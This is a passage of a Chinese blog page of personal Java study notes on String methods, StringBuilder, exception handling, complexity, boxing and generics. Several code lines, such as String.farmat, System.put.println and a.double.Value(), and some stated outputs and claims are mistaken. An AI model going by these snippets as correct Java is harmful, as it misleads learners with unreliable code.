alt="image-20240208201812965"></p><p>存储双引号引起来的值<br>存储内容为字符串的常量值<br><strong>存储步骤：</strong><br>看 常量池有无当前字符串<br>无 存入<br>有 获取已经存储在常量池中的值的地址</p><p>StringTable –&gt;其实是一个哈希表</p><p><strong>作用</strong><br>提高存储效率</p><p>使用String方法时 默认先进行字符串长度比较 再进行内容比较（hash）return ASCII差值（相同则返回长度）</p><h4 id="equals方法比较"><a href="#equals方法比较" class="headerlink" title="equals方法比较"></a>equals方法比较</h4><p>比较内容是否相等<br>返回boolen类型（true&#x2F;flase）<br>按照字典序（字符的大小顺序）<br>先长度后大小</p><h4 id="CompareTo方法比较"><a href="#CompareTo方法比较" class="headerlink" title="CompareTo方法比较"></a>CompareTo方法比较</h4><p>返回int类型</p><p>先按照字典次序大小比较，如果出现不等的字符，直接返回这两个字符的大小差值 </p><p>如果前k个字符相等(k为两个字符长度最小值)，返回值两个字符串长度差值</p><h4 id="忽略大小写进行比较"><a href="#忽略大小写进行比较" class="headerlink" title="忽略大小写进行比较"></a>忽略大小写进行比较</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="string">&quot;Abcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">System.out.println(str3.compareToIgnoreCase(str4));<span class="comment">//输出0</span></span><br></pre></td></tr></table></figure><h4 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h4><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211195141440.png" alt="image-20240211195141440">从0下标开始<br>例如lastIndexof（）</p><h4 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h4><h5 id="数值和字符串转化"><a href="#数值和字符串转化" class="headerlink" title="数值和字符串转化"></a>数值和字符串转化</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> String.value（<span class="number">1234</span>）<span class="comment">//整型转字符串</span></span><br><span class="line"><span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;1234&quot;</span>);<span class="comment">//输出int型</span></span><br><span class="line"><span class="type">double</span> <span class="variable">data1</span> <span class="operator">=</span> parseDouble(<span class="string">&quot;12.34&quot;</span>);<span class="comment">//输出double型</span></span><br></pre></td></tr></table></figure><h5 id="大小写转化"><a href="#大小写转化" class="headerlink" title="大小写转化"></a>大小写转化</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str1.toUpperCase(str1);</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str1.toLowerCase(str2);</span><br></pre></td></tr></table></figure><p><strong>java中String是不可变的</strong><br>在java中 hello-&gt;转化不是在原来的字符串基础上转换 而是产生了一个新的对象 </p><h5 id="字符串转数组"><a href="#字符串转数组" class="headerlink" title="字符串转数组"></a>字符串转数组</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span>[] arry = str1.toCharArray（）;</span><br></pre></td></tr></table></figure><h5 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.farmat(<span class="string">&quot;%d-%d-%d&quot;</span>,<span class="number">2023</span>,<span class="number">9</span>,<span class="number">28</span>);</span><br></pre></td></tr></table></figure><h4 id="字符串的替换"><a href="#字符串的替换" class="headerlink" title="字符串的替换"></a>字符串的替换</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;ababcabcdabcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str.replace(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//把所有的&quot;ab&quot;进行替换</span></span><br><span class="line"><span class="comment">//不是在原来字符串上进行替换 产生了一个新的对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ret2</span> <span class="operator">=</span> str.replace(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret3</span> <span class="operator">=</span> str.replaceFirst(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//只替换第一个&quot;ab&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret4</span> <span class="operator">=</span> str.replaceAll(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//替换所有的&quot;ab&quot;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>replace和replaceALL的区别<br>replaceALL支持正则表达式<br>replace不支持正则表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab43a2c43d&quot;</span>); </span><br><span class="line"></span><br><span class="line">System.out.println(src.replace(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;ab4f2c4fd. </span><br><span class="line">    </span><br><span class="line">System.out.println(src.replace(<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;f&#x27;</span>));</span><br><span class="line">=&gt;ab4f2c4fd. </span><br><span class="line">       System.out.println(src.replaceAll(<span class="string">&quot;\\d&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;abffafcffd. </span><br><span class="line">       System.out.println(src.replaceAll(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;fb43fc23d. </span><br><span class="line">       System.out.println(src.replaceFirst(<span class="string">&quot;\\d,&quot;</span>f<span class="string">&quot;));</span></span><br><span class="line"><span class="string">=&gt;abf32c43d     </span></span><br><span class="line"><span class="string">       System.out.println(src.replaceFirst(&quot;</span><span class="number">4</span><span class="string">&quot;,&quot;</span>h<span class="string">&quot;));</span></span><br><span class="line"><span class="string">=&gt;abh32c43d.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>“\”在java中是一个转义字符，所以需要用两个代表一个。例如System.out.println( “\“ ) ;只打印出一个”&quot;。但是“\”也是正则表达式中的转义字符，需要用两个代表一个。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;<span class="subst">\\</span><span class="subst">\\</span>&quot;</span>被java转换成<span class="string">&quot;<span class="subst">\\</span>&quot;</span>，<span class="string">&quot;<span class="subst">\\</span>&quot;</span>又被正则表达式转换成<span class="string">&quot;<span class="subst">\&quot;</span></span></span><br></pre></td></tr></table></figure><h4 id="字符串拆分"><a href="#字符串拆分" class="headerlink" title="字符串拆分"></a>字符串拆分</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;name=yub&amp;age=0.4&quot;</span>;</span><br><span class="line">String[] string = str.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line"><span class="comment">//分割之后的结果要存储在数组中</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;yu bo love&quot;</span>;</span><br><span class="line">String[] string = str.split(<span class="string">&quot; &quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//分成三组输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; string.length; i++)&#123;</span><br><span class="line">System.out.println(string[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>1.字符”|”,”*”,”+”都得加上转义字符，前面加上 “\&quot; .<br>2.是 “&quot; ，那么就得写成 “\\“ .<br>3.如果一个字符串中有多个分隔符 可以用”|”作为连字符</p><h4 id="字符串的截取"><a href="#字符串的截取" class="headerlink" title="字符串的截取"></a>字符串的截取</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;yublove&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> s.substring(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//输出&quot;ublove&quot;</span></span><br><span class="line"><span class="comment">//如果为String ret = s.substring(0); 模特让你返回原来的对象 但如果传入其他对象 则返回新对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;yublove&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> s.substring(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//java中都是左闭右开 ret值为ubl</span></span><br></pre></td></tr></table></figure><h4 id="其他操作方法"><a href="#其他操作方法" class="headerlink" title="其他操作方法"></a>其他操作方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot; y u b love &quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> str.trim();</span><br><span class="line"><span class="comment">//ret1的值为&quot;y u b love&quot; 去掉左右空格 剩余中间空格</span></span><br></pre></td></tr></table></figure><hr><p><strong>字符串为什么是不可变的</strong>？<br>final修饰基本数据类型 基本数据类型的值不能被改变<br>final修饰引用类型 引用类型的指向不可改变 但内容可改<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211211120608.png" alt="image-20240211211120608"></p><p>但value指向的内容可以发生改变</p><p>为什么 String 要设计成不可变的?(不可变对象的好处是什么?) 1. 方便实现字符串对象池. 如果 String 可变, 那么对象池就需要考虑写时拷贝的问题了.<br>2.不可变对象是线程安全的.<br>3.不可变对象更方便缓存 hash code, 作为 key 时可以更高效的保存到 HashMap 中.</p><p>不是所有的传引用 都是改变原来的值  具体情况依据代码而定 有可能只改变了指向</p><h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><p>StringBuffuer不能直接赋值  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringbuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//重写tostring方法 输出yub</span></span><br><span class="line">stringBulider.append(<span class="string">&quot;bo&quot;</span>);</span><br><span class="line">stringBulider.append(<span class="string">&quot;yu&quot;</span>).append(<span class="number">13.14</span>);</span><br><span class="line"><span class="comment">//进行拼接 效率高于&quot;+&quot;</span></span><br></pre></td></tr></table></figure><p>StringBuilder和StingBuffer是可变的 效率更高</p><p>StringBuilder不考虑并发<br>StringBuffer适用于多线程<br><strong>注意</strong><br>String和StringBuilder类不能直接转换。<br>互相转换，可以采用如下原则:<br> String变为StringBuilder: 利用StringBuilder的构造方法或append()方法<br>StringBuilder变为String: 调用toString()方法</p><h5 id="String、StringBuffer、StringBuilder的区别"><a href="#String、StringBuffer、StringBuilder的区别" class="headerlink" title="String、StringBuffer、StringBuilder的区别"></a>String、StringBuffer、StringBuilder的区别</h5><p>1.String的内容不可修改，StringBuffer与StringBuilder的内容可以修改.<br>2.StringBuffer与StringBuilder大部分功能是相似的 StringBuffer采用同步处理，属于线程安全操作；<br>3.StringBuilder未采用同步处理，属于线程不安全操</p><h4 id="异常-1"><a href="#异常-1" class="headerlink" title="异常"></a>异常</h4><h5 id="编译时异常-受查异常"><a href="#编译时异常-受查异常" class="headerlink" title="编译时异常&#x2F;受查异常"></a>编译时异常&#x2F;受查异常</h5><p>CloneNotSupported</p><h5 id="运行时异常-非受查异常"><a href="#运行时异常-非受查异常" class="headerlink" title="运行时异常&#x2F;非受查异常"></a>运行时异常&#x2F;非受查异常</h5><p>数组越界<br>空指针<br>算数异常</p><h5 id="异常的处理"><a href="#异常的处理" class="headerlink" title="异常的处理"></a>异常的处理</h5><p><strong>事前防御</strong><br><strong>事后认错</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">执行可能出现异常的代码</span><br><span class="line">&#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">匹配</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">执行资源的饿关闭</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优势：正常流程和错误流程分开处理</p><h6 id="异常处理的五个关键字"><a href="#异常处理的五个关键字" class="headerlink" title="异常处理的五个关键字"></a>异常处理的五个关键字</h6><h6 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h6><p>抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//抛出一个自定异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>(<span class="string">&quot;a == 10&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>   1.throw必须写在方法体内部 </p><ol start="2"><li>抛出的对象必须是Exception 或者 Exception 的子类对</li><li>如果抛出的是 RunTimeException 或者RunTimeException 的子类，则可.以不用处理，直接交给JVM来处理 </li><li>如果抛出的是编译时异常，用户必须处理，否则无法通过编译 </li><li>异常一旦抛出，其后的代码就不会执</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//throws CloneNotSupportException一般放在方法声明的地方</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportExceptionthrows&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//JVM进行处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportExceptionthrows &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//抛出一个自定异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>(<span class="string">&quot;a == 10&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><ol><li>throws必须跟在方法的参数列表之后 </li><li>声明的异常必须是 Exception 或者 Exception 的子类 </li><li>方法内部如果抛出了多个异常，throws之后必须跟多个异常类型，之间用逗号隔开，如果抛出多个异常类型 具有父子关系，直接声明父类即可。</li></ol><p><strong>关于异常的处理方式</strong><br>异常的种类有很多, 我们要根据不同的业务场景来决定.<br>对于比较严重的问题(例如和算钱相关的场景), 应该让程序直接崩溃, 防止造成更严重的后果 对于不太严重的问题(大多数场景), 可以记录错误日志, 并通过监控报警程序及时通知程序猿 对于可能会恢复的问题(和网络相关的场景), 可以尝试进行重试. </p><h5 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;其他业务代码&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个异常没有被处理 会交给jvm处理 一旦由jvm处理 程序就绪异常终止</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  System.out.println(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">    System.put.println(<span class="string">&quot;捕获到了算术异常！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>catch一定要捕获一个对应的异常 否则最后还是交给jvm</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">try</span> &#123;</span><br><span class="line">  <span class="title class_">System</span>.<span class="property">out</span>.<span class="property">println</span>(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">&#125;<span class="title function_">catch</span>(<span class="params">Exception</span> <span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title class_">System</span>.<span class="property">put</span>.<span class="property">println</span>(<span class="string">&quot;捕获到了算术异常！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exception是所有类的父类 不能区分exception捕捉的是什么异常 不建议使用exception进行判断</p><p>可以通过’|’并写很多个异常检查<br>或者分开写 将Exception父类写到最后</p><p><strong>注意</strong><br>1.try块内抛出异常位置之后的代码将不会被执行 </p><p>2.如果抛出异常类型与catch时异常类型不匹配，即异常不会被成功捕获，也就不会被处理，继续往外抛，直到 JVM收到后中断程序—-异常是按照类型来捕获的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">int</span>[] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">System.out.println(array[<span class="number">3</span>]); <span class="comment">// 此处会抛出数组越界异常</span></span><br><span class="line">&#125;<span class="keyword">catch</span> (NullPointerException e)&#123; <span class="comment">// 捕获时候捕获的是空指针异常--真正的异常无法被捕获到</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;后序代码&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArrayIndexOutOfBoundsException: 3at day20210917.ArrayOperator.main(ArrayOperator.java:<span class="number">24</span>)</span><br></pre></td></tr></table></figure><p>3.try中可能会抛出多个不同的异常对象，则必须用多个catch来捕获—-即多种异常，多次捕获</p><ol start="4"><li>可以通过一个catch捕获所有的异常，即多个异常，一次捕获(不推荐)</li></ol><h5 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h5><p>在写程序时，有些特定的代码，不论程序是否发生异常，都需要执行，比如程序中打开的资源：网络连接、数据库 连接、IO流等，在程序正常或者异常退出时，必须要对资源进进行回收。另外，因为异常会引发程序的跳转，可能 导致有些语句执行不到，finally就是用来解决这个问题的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">// 可能会发生异常的代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型 e)&#123;</span><br><span class="line"><span class="comment">// 对捕获到的异常进行处理</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line"><span class="comment">// 此处的语句无论是否发生异常，都会被执行到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果没有抛出异常，或者异常被捕获处理了，这里的代码也会执行</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>finally中的代码一定会执行的，一般在finally中进行一些资源清理的扫尾工作。<br>finally中的语句一定会执行</p><p><strong>throw和throw的区别</strong></p><p>throw是抛出一个异常<br>throws是对一个异常的声明</p><h4 id="异常的处理流程"><a href="#异常的处理流程" class="headerlink" title="异常的处理流程"></a>异常的处理流程</h4><p>程序先执行try 中的代码<br>如果try中的代码出现异常,就会结束try 中的代码,看和catch中的异常类型是否匹配.如果找到匹配的异常类型,就会执行catch中的代码<br>如果没有找到匹配的异常类型,就会将异常向上传递到上层调用者.<br>无论是否找到匹配的异常类型, finally中的代码都会被执行到(在该方法结束之前执行).如果上层调用者也没有处理的了异常,就继续向上传递.<br>一直到main方法也没有合适的代码处理异常,就会交给ⅣM-来进行处理,此时程序就会异常终止.</p><h4 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h4><p> 1.自定义异常类，然后继承自Exception 或RunTimeException </p><ol start="2"><li>实现一个带有String类型参数的构造方法，参数含义：出现异常的原因</li></ol><p><strong>注意</strong><br>自定义异常通常会继承自 Exception 或者 RuntimeException 继承自 Exception 的异常默认是受查异常 继承自 RuntimeException 的异常默认是非受查异常</p><p><strong>受查异常</strong><br>IOException（同输入输出相关的操作，如无效输入，打开一个不存在在文件）<br>ClassNotFoundException（使用不存在的类）</p><p>特征：编译就不能通过。方法要抛出的受查异常必须在方法头中显示声明，然后编译器会核查是否为所有的受查异常提供了构造器（try-catch）。</p><p><strong>非受查异常</strong><br>ArithmeticException（算数异常）<br>NullPointerException（指向对象为空异常）<br>IndexOutOfBoundsException（数组超标异常）<br>IllegalArgumentException（传递非法参数异常）</p><p>特征：可以通过编译，从名字知道，他的错误发生在运行时，上面的 1&#x2F;0 就是一个算数异常，它可以通过编译，但无法运行。不要求显示声明非受查异常（try-catch是无法解决RE异常的，但是仍旧可以捕捉RE异常）。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240213105150875.png" alt="image-20240213105150875"></p><h3 id="时间复杂度和空间复杂度"><a href="#时间复杂度和空间复杂度" class="headerlink" title="时间复杂度和空间复杂度"></a>时间复杂度和空间复杂度</h3><p>1、用常数1取代运行时间中的所有加法常数。<br>2、在修改后的运行次数函数中，只保留最高阶项。<br>3、如果最高阶项存在且不是1，则去除与这个项目相乘的常数。得到的结果就是大O阶。</p><p>两个算法乳沟比较复杂度时 比较最坏情况</p><p><strong>递归的复杂度 &#x3D; 递归的次数 * 每次递归的次数</strong></p><h3 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h3><p>java中基本类型不是继承自object 非了在泛型代码中支持基本类型 java给每个基本类型一个包装类型</p><h4 id="装箱"><a href="#装箱" class="headerlink" title="装箱"></a>装箱</h4><p>把一个基本数据类型转化为包装类型的数据<br><strong>分类</strong><br>自动装箱（隐式）<br>显示装箱</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="comment">//输出b为10 隐式装箱</span></span><br><span class="line"></span><br><span class="line"><span class="type">Integer</span> <span class="variable">c</span> <span class="operator">=</span> Integer.valueOf(a);</span><br><span class="line"><span class="comment">//显示装箱</span></span><br></pre></td></tr></table></figure><h3 id="拆箱"><a href="#拆箱" class="headerlink" title="拆箱"></a>拆箱</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="comment">//自动拆箱</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示拆箱 拆箱为自己指定的元素</span></span><br><span class="line"><span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> a.intValue();</span><br><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> a.<span class="type">double</span>.Value();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">System.out.println(a == b);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">System.out.println(a2 == b2);</span><br><span class="line"><span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>valueOf底层源码范围为-128~127（256）超出范围相当于new了一个新对象 return false</p><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><p>一般的类和方法 只能使用具体的类型（基本类型&#x2F;自定义的类）</p><p>JDK1.5引入 泛型 适用于多种类型 从代码上讲就是对类型实现了参数化</p><h4 id="引出泛型"><a href="#引出泛型" class="headerlink" 